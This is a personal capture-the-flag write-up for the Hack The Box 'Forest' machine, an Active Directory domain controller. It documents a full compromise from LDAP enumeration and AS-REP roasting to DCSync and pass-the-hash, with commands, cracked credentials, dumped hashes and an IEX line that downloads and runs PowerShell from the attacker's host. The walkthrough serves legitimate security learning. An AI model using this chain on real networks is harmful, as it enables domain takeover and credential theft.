# forest
This box will be my first windows domain controller. Expecting this writeup to be quite lengthy with eplanation of the tools and how the active directory hierarchy works.

# services
```bash
# Nmap 7.93 scan initiated Fri Apr 28 18:56:37 2023 as: nmap -sC -sV -o nmap/initial.nmap 10.129.95.210
Nmap scan report for 10.129.95.210
Host is up (0.052s latency).
Not shown: 989 closed tcp ports (conn-refused)
PORT     STATE SERVICE      VERSION
53/tcp   open  domain       Simple DNS Plus
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2023-04-28 23:03:34Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h26m49s, deviation: 4h02m29s, median: 6m49s
| smb-security-mode:
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode:
|   311:
|_    Message signing enabled and required
| smb2-time:
|   date: 2023-04-28T23:03:42
|_  start_date: 2023-04-28T22:59:57
| smb-os-discovery:
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2023-04-28T16:03:38-07:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Apr 28 18:56:59 2023 -- 1 IP address (1 host up) scanned in 22.04 seconds
```
### services

additional nmap scans were run to determine all tcp ports open:
```bash
nmap -p- --min-rate 10000 -o nmap/alltcp 10.129.213.147
```
**This revealed port 5985, which is used for winrm or remote access**

All other ports in this scan reflect that of a domain controller which is discussed in more depth later...

### 
The nmap script reveals two domain names:
* htb.local - the name of the domain
* forest.htb.local - fqdn, which is a fully qualified domain name, or a complete domain name for a specific resource within the domain. 
*this may be a domain controller and the fqdn is the name of it*

but how would we determine if it is a domain controller?? All that is stated in the walkthrough is that based on the services it can be determined.
**Thats becuase the device is running dns, kerberos, and ldap. With this trio of services availabe it's likely that the device is acting as a domain controller. Thats because kerberos is used as the authentication method within an active directory domain, dns is used to locate domain controllers, and without it users and computers would not be able to log on to the domain, and of course LDAP is the protocol used to query active directory.**

We can issue dns requests with dig to the two domain names retreived from nmap and we can confirm that they both resolve.

``dig @$IP htb.local``
However, zone transfers fail.

## enumeration

### enumerating ldap with ldapsearch

**enumerating base dn** 
The base dn is distinguished domain, which is the unique identifier for an object in an LDAP directory. Before we can enumerate the directory, we will need to discover the base dn of this device. To do that with ldapsearch the following query can be used:
```bash
ldapsearch -x -H ldap://$IP -s base namingcontexts
```
-x simple authentication
-H URI
-s scope (select the scope to search within the LDAP tree)
    base - retrieves only the entry at the base DN
    namingcontexts - the attribute you want to retreive from the LDAP server.

So this query retrieves the base dn:
```bash

└─# ldapsearch -x -H ldap://$IP -s base namingcontexts
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts
#

#
dn:
namingContexts: DC=htb,DC=local
namingContexts: CN=Configuration,DC=htb,DC=local
namingContexts: CN=Schema,CN=Configuration,DC=htb,DC=local
namingContexts: DC=DomainDnsZones,DC=htb,DC=local
namingContexts: DC=ForestDnsZones,DC=htb,DC=local

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```
Now that we have the base dn, we want to enumerate objects within the dn.
``ldapsearch -x -H ldap://$IP -b 'DC=htb,DC=local'``
This will enumerate the base dn object 'DC=htb,DC=local' and return all the entries and attributes found within the subtree of the LDAP directory beneath the base dn.
The items returned from this request can be extensive, so either save it in a file and grep the file or query further to retreives specific information. We will be constructing more specific queries for the domain htb.local to find other objects of interest.

### querying for other objects

``ldapsearch -x -H ldap://$IP -b 'DC=htb,DC=local' '(ObjectClass=Person)'``
queries the htb.local domain for any person objects. This will sometimes include mailbox objects, as well as users.

we can then filter the results if based on the values that we need. 

``ldapsearch -x -H ldap://$IP -b 'DC=htb,DC=local' '(ObjectClass=Person)' sAMAccountName | grep sAMAccountName | awk '{print $2}' > userlist.ldap``
This query filters for usernames and then directs them to make a username file for bruteforcing.

### determine pass-pol 
before bruteforcing the server we should attempt to get the password policy by using **crackmapexec**

To do this we will use smb and the crackmapexec tool with the following command. Note that this method with null user/pass only works on older servers from 2003 that have since been upgraded. Anonymous users used to have this capability so it was grandfathered in for older systems:

```

└─$ crackmapexec smb $IP -u '' -p '' --pass-pol
[*] First time use detected
[*] Creating home directory structure
[*] Creating default workspace
[*] Initializing SSH protocol database
[*] Initializing MSSQL protocol database
[*] Initializing WINRM protocol database
[*] Initializing SMB protocol database
[*] Initializing LDAP protocol database
[*] Initializing RDP protocol database
[*] Initializing FTP protocol database
[*] Copying default configuration file
[*] Generating SSL certificate
/usr/lib/python3/dist-packages/pywerview/requester.py:144: SyntaxWarning: "is not" with a literal. Did you mean "!="?
  if result['type'] is not 'searchResEntry':
SMB         10.129.95.210   445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.129.95.210   445    FOREST           [+] htb.local\:
SMB         10.129.95.210   445    FOREST           [+] Dumping password info for domain: HTB
SMB         10.129.95.210   445    FOREST           Minimum password length: 7
SMB         10.129.95.210   445    FOREST           Password history length: 24
SMB         10.129.95.210   445    FOREST           Maximum password age: Not Set
SMB         10.129.95.210   445    FOREST
SMB         10.129.95.210   445    FOREST           Password Complexity Flags: 000000
SMB         10.129.95.210   445    FOREST               Domain Refuse Password Change: 0
SMB         10.129.95.210   445    FOREST               Domain Password Store Cleartext: 0
SMB         10.129.95.210   445    FOREST               Domain Password Lockout Admins: 0
SMB         10.129.95.210   445    FOREST               Domain Password No Clear Change: 0
SMB         10.129.95.210   445    FOREST               Domain Password No Anon Change: 0
SMB         10.129.95.210   445    FOREST               Domain Password Complex: 0
SMB         10.129.95.210   445    FOREST
SMB         10.129.95.210   445    FOREST           Minimum password age: 1 day 4 minutes
SMB         10.129.95.210   445    FOREST           Reset Account Lockout Counter: 30 minutes
SMB         10.129.95.210   445    FOREST           Locked Account Duration: 30 minutes
SMB         10.129.95.210   445    FOREST           Account Lockout Threshold: None
SMB         10.129.95.210   445    FOREST           Forced Log off Time: Not Set
```

And we are returned the password policy. This policy **does not lockout for brute force attempts.** 
Now we know we are free to try as many attempts as we please.

### bruteforce attempt in background
We also will use crackmpapexec to bruteforce for passwords.
``crackmapexec smb $IP -u userlist.txt -p pwlist.txt``

This will use smb to brute force with a user and passwordlist for a spraying attack. This is very time consuming as both lists will be ran at the same time...

### getting a hash from a user without preauthentication using IMPACKET script
While this runs in the background we can try to find another way to retreive a password for a user, mainly with Impacket. Impacket includes alot of python scripts that will attempt to gather information from active directory. We can use ``locate impacket`` to find the directory that the scripts are located in.

One script we are going to be using is GetNPUsers.py:

> Queries target domain for users with 'Do not require Kerberos preauthentication' set and export their TGTs for cracking

When a user object has this setting enabled, they do not need to preauthenticate with the KDC (Key Distribution Center) to get a TGT(Ticket Granting Ticket), anyone can request a TGT for this user. This can lead to offline brute forcing, since a TGT is encrypted with the users password hash. The TGT contains a session key and other data within the structure. An attacker will know when they have cracked the TGT, because of the plaintext of the other data (i.e the username).

**So the goal with determining NPUsers is to get the TGT, crack it with a valid password hash, and then login as the user**

```bash
# python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py -request -usersfile userlist.ldap -dc-ip $IP htb.local/       
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-alfresco@HTB.LOCAL:6bf3b4a28bd5503be1481e4df26d17f9$ae0b28185cfdb5790bbd7a259aa71bee4a8034ef589edad34627ccb01ac887ecf3acebb2f9311ed162867e68f07c96bfc08e79c97e3ad6dec855f39acd8aaa9c0d9a5d28d657972126c775dbc8d1ac29122780f3a94d2fb50192dfeb31b79e1d38c5c749fcb588a17718b929e5cb5fea8e455ecab68d87d172132dec6031b2a0bc0e3daae13660e74b6d48cccf40e82f4389a5507dfbdb5f1ebd03c0b195f80cffbbd75c72097802be99adc6ca878c8dbbccd3e753d741d58457badc70f3449212ca9591c9d2ac59b268eebbcd92a71771759f504da27d4d785744370bfbfdf60b03b70bf4cb
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
```
> $krb5asrep$23$svc-alfresco@HTB.LOCAL:86b0829f087d5c9869986a84842dd533$7a1ba25dd13aa1ce24ad42bc36ea7757f2825d586c9f668f7e530db5ce8f90e595e330bb4ba87f8a195f0b23d06ba0002a7ec8e99ad16d9bbca07b0fd61e31e6ebeb41fae55b36901b8d3869d0831e31422cf830653cac71a696113f09f297c553c6f12678ccd572ef2d1631852384d186c83ce7b613441d6694f933e3eb125d53c486512295afcc5fccd2c8a650e349184ef0ac8dccd41b3d67f7c5f9588cc5379fbffd9e063f029599bfc426fb804ad1763917dfec089a1ad5d7a8dff633a740f910f299dcbd7a78d2b4647dfe799521399154152a88b2eeb0dc1c4ab9b03c771aceb09bf9

And we are able to crack this hash with hashcat:
```bash
rojo@buntu22:/dev/shm$ hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt /usr/share/hashcat/rules/best64.rule --show
$krb5asrep$23$svc-alfresco@HTB.LOCAL:86b0829f087d5c9869986a84842dd533$7a1ba25dd13aa1ce24ad42bc36ea7757f2825d586c9f668f7e530db5ce8f90e595e330bb4ba87f8a195f0b23d06ba0002a7ec8e99ad16d9bbca07b0fd61e31e6ebeb41fae55b36901b8d3869d0831e31422cf830653cac71a696113f09f297c553c6f12678ccd572ef2d1631852384d186c83ce7b613441d6694f933e3eb125d53c486512295afcc5fccd2c8a650e349184ef0ac8dccd41b3d67f7c5f9588cc5379fbffd9e063f029599bfc426fb804ad1763917dfec089a1ad5d7a8dff633a740f910f299dcbd7a78d2b4647dfe799521399154152a88b2eeb0dc1c4ab9b03c771aceb09bf9:s3rvice
```
**s3rvice**

### winrm
Now that we've retreived the service accounts password we will attempt to authenticate as svc-alfresco on the winrm port 5895

```bash

└─$ ruby evil-winrm.rb -i 10.129.194.116 -u svc-alfresco -p s3rvice

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> ls
```

## privEsc

user flag is inside the Desktop folder

since I am new to windows privEsc I am going to run winpeas. However to transfer the file instead of just setting up an http server, we are going to setup an smb server incase wget or scp are disabled or blocked. This is because smb is native to windows and likely to be operational on all windows devices.

* use impacket-smbserver to startup an smb server named Reddish with smb2 enabled and user/pass reddish/red in the pwd
```bash

┌──(kali㉿kali)-[~/htb/box/forest/smb]
└─$ impacket-smbserver Reddish $(pwd) -smb2support -user reddish -password red
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```
* create a secure string on powershell to be used with credential object
```powershell
*Evil-WinRM* PS C:\> $pass = convertto-securestring 'red' -AsPlainText -Force
*Evil-WinRM* PS C:\> echo $pass
System.Security.SecureString
```
* create credential object with secure string $pass
```powershell

*Evil-WinRM* PS C:\> $cred = New-Object System.Management.Automation.PSCredential('reddish', $pass)
*Evil-WinRM* PS C:\> $cred

UserName                     Password
--------                     --------
reddish  System.Security.SecureString
```
* connect to the share
```powershell

*Evil-WinRM* PS C:\> New-PSDrive -Name reddish -PSProvider FileSystem -Credential $cred -Root \\10.10.14.142\Reddish

Name           Used (GB)     Free (GB) Provider      Root                                                                                                                                                                                 CurrentLocation
----           ---------     --------- --------      ----                                                                                                                                                                                 ---------------
reddish                                FileSystem    \\10.10.14.142\Reddish
```
Now we can connect to the share drive from the victims machine and run the winpeas to enumerate the foothold.

Don't find anything of interest with winpeas, but we are on a domain controller, so we will check out Bloodhound for the first time

### Bloodhound

First thing to cover is **Sharphound**, which is an *ingester*? used with bloodhound. It's the program that does all of the work in making the queries and discovering the structure of the active directory. While bloodhound uses neo4j to graph the results returned from Sharphound. 

We ran sharphound to collect information about the ad domain and placed it in our Smb server to be retreived. The returned data is a zip archive of json formatted files and this can be dragged and dropped or imported directly into blooldhound.

For some reason sharphound is not returning accurate results. In walkthroughs it shows svc-alfresco being in the Service Account group -> Privileged IT Account -> Account Operators. Which means that svc-alfresco is basically an account operator and can add users 

**Account Operators** group gives users permissions to add/read/modify user accounts in the domain. Bloodhound gives us AbuseInfo to add a user to the **Exchange Windows Permissions** group. From this group we have permissions to have WriteDacl on the domain.

We can add a user to that domain using the net command
```powershell
net group "Exchange Windows Permissions" svc-alfresco /add /domain
```
#### WriteDACL
WriteDacl or Write Discretionary Access Control List, is a component of an objects security descriptor and controls who can access the object and what they can do with it. This is a powerful permission, as it can enable a user or security principal to grant themselves additional permissions on the boject. In this scenario we have WriteDacl on the domain, which allows us to modify the permissions and grant a user full control, essentially making them a domain admin.

To exploit this WriteDacl we will add the rights DCsync to a user.

#### DCSync
DCSync abuses Windows Replication Service to replicate the contents of the ACtive Directory DAtabase, which includes users password hashes.

### powersploit privEsc
We will be using powersploit to grant the svc-alfresco user the DCSync privilege. 
First we will need to load powersploit into memory
```powershell
IEX(New-Object Net.WebClient).downloadString('http://10.10.14.8:8888/PowerView.ps1')
```

Then we will create a credential object like we did before with the smb server:
```powershell
$pass = convertto-securestring 's3rvice' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('htb\svc-alfresco', $pass)
Add-DomainObjectAcl -Credential $cred -PrincipalIdentity 'svc-alfresco' -TargetIdentity 'DC=htb,DC=local' -Rights DCSync
```
Now that the svc-alfresco has DCSync rights we are able to use another module of impacket secretsdump.py to get the hashes from NTDS.DIT file
```
secretsdump.py svc-alfresco:s3rvice@10.10.10.161
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
``` 
Now that we have the NTLM hash of the administrator we are able to pass the hash and authenticate with it.
**NTLM protocol** allows for users to authenticate with either the password or the hash which is where "pass-the-hash" comes from. With this all we need to do is leak the NTLM hash of the users and we can login to the server using psexec.py

```bash
# ./psexec.py -hashes 32693b11e6aa90eb43d32c72a07ceea6:32693b11e6aa90eb43d32c72a07ceea6 administrator@10.129.163.119
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 10.129.163.119.....
[*] Found writable share ADMIN$
[*] Uploading file esMZStKO.exe
[*] Opening SVCManager on 10.129.163.119.....
[*] Creating service uXQE on 10.129.163.119.....
[*] Starting service uXQE.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32> 
```
in psexec.py you need to provide a LM hash before the NTLM hash (LM/NTLM), but the hash used with admins hash was an 'empty' hash, so any arbitrary hash worked.
**psexec** is a tool used to authenticate to the remote machine and spawn a new process to execute commands with. It uses SMB and RPC to do this.

We could also connect remotely with evil-winrm, as long as NTLM is accepted.

### beyondRoot

The reason I was unable to get the hashed passwords from the NTDS.DIT file was becaused of a script restore.ps1 being ran every 60 seconds. The script searched for each user in user.txt and removed them from any groups not named "Service Accounts" and then it would remove the DCSync rights I added. If I had created a one liner and then attempted to DCSync I would have been able to retreive the hashes.
